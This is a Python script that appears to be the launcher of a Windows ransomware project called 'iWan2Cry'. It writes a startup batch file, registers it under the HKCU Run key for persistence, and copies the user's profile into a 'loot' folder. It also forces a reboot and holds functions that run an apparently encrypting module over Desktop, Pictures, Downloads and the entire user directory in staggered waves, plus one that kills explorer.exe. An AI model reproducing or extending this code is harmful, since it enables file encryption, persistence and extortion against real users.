import main_v2
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Util import Counter
import argparse
import sys
import base64
import platform 
import getpass
import socket
import base64
import zipfile
import discover
import modify
from gui import mainwindow
import time
import os
import subprocess
import threading
import winreg
import shutil

def func1():
    HEI = subprocess.check_output("whoami", shell=True)
    HEI = HEI.decode("UTF-8").strip()
    LOL = HEI.split("\\")[-1]
    return LOL

var1 = func1()
var2 = os.path.abspath("START.py")
var3 = os.path.dirname(os.path.abspath(__file__))
var4 = var3 + "\\startup.bat"
var5 = r"C:\\"
var6 = r"C:\\Users\\" + var1 + r"\\Desktop"
var7 = "loot"
var8 = f"-p C:\\Users\\{var1}\\Desktop\\loot -e"
var9 = f"-p C:\\Users\\{var1}\\Pictures -e"
var10 = f"-p C:\\Users\\{var1}\\Downloads -e"
var11 = f"-p C:\\Users\\{var1}\\Desktop -e"
death = f"-p C:\\Users\\{var1} -e"
var12 = f"{var8} {var9} {var10} {var11} {death}"

def func2():
    try:
        os.system('shutdown /r /t 0 /f')
    except Exception as e:
        print(f"Error while trying to reboot: {e}")


def func3():
    os.system(f"echo @echo off > C:\\Users\\{var1}\\Desktop\\iWan2Cry\\iWan2Cry\\startup.bat")
    os.system(f"echo start /B pyw \"C:\\Users\\{var1}\\Desktop\\iWan2Cry\\iWan2Cry\\START.py\" >> C:\\Users\\{var1}\\Desktop\\iWan2Cry\\iWan2Cry\\startup.bat")

def func4(var5, var6, var1, var7):
    try: 
        if not os.path.exists(var6 + "loot"):
            for foldername, subfolders, filenames in os.walk(var5):
                if var1.lower() in [subfolder.lower() for subfolder in subfolders]:
                    source_user_folder = os.path.join(foldername, var1)
                    destination_user_folder = os.path.join(var6, var7)
                
                    
                    shutil.copytree(source_user_folder, destination_user_folder)
                    print("Kopiert brukermappen til: {destination_user_folder}")
        else:
            print(f"Loot-map already exists")
    except Exception as e:
        print(f"Feil ved kopiering av brukermapper {e}")
        

def func5(var2, var12):
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    key_name = "SandOrmVarHer"
    
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, key_name, 0, winreg.REG_SZ, var4)
    except Exception as e:
        print(f"NOE FEIL SKJER: {e}")


def func6(var12):
    main_var2 = os.path.join(var3 , 'main_v2.py')
    
    command = f"py {main_var2} {var12}"
    subprocess.run(command, shell=True)
    
def func6_with_delay(var12, delay):
    func6(var12)
    time.sleep(delay)
    
   
def func7():
    
    
    thread_1 = threading.Thread(target=func6_with_delay, args=(var8, 10))

    
    thread_2 = threading.Thread(target=func6_with_delay, args=(var9, 10))
    thread_3 = threading.Thread(target=func6_with_delay, args=(var10, 10))
    thread_4 = threading.Thread(target=func6_with_delay, args=(var11, 10))
    thread_5 = threading.Thread(target=func6_with_delay, args=(death, 10))

    
    thread_1.start()
    time.sleep(1800)
    thread_2.start()
    time.sleep(1800)
    thread_3.start()
    time.sleep(1800)
    thread_4.start()
    time.sleep(900)
    thread_5.start()

    
    thread_1.join()
    thread_2.join()
    thread_3.join()
    thread_4.join()
    thread_5.join()

def func8():
    os.system("taskkill /f /im explorer.exe")

def main():
    func3()
    func5(var2, var12)
    func4(var5, var6, var1, var7)
    func2()
    
    
if __name__ == "__main__":
    main()
